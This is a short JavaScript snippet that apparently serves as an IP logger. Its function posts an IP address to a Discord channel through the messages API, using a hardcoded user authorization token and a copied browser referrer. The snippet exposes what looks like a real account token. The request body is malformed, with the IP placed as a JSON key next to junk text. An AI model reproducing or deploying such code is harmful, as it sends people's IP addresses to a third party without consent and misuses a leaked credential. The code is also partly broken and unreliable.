function generateNonce() {
    return Math.random() * 1000000
}

function sendIPToDiscord(ip) {
    fetch("https://discord.com/api/v9/channels/1205072221370847255/messages", {
  "headers": {
    "accept": "*/*",
    "authorization": "MTIwNTA3MTcwMzExMDE4OTA1Ng.G7Ju5A.TtjYYvCBkayNgRISfiL-sjiqmS1ANX68tO5uMQ",
    "content-type": "application/json",
  },
  "referrer": "https://discord.com/channels/1205072221370847252/1205072221370847255",
  "referrerPolicy": "strict-origin-when-cross-origin",
  "body": "{\"mobile_network_type\":\"unknown\",\"" + ip  + "\":\"dsafsdf\",\"nonce\":\"" + generateNonce() + "\",\"tts\":false,\"flags\":0}",
  "method": "POST",
  "mode": "cors",
  "credentials": "include"
});
}

sendIPToDiscord("test")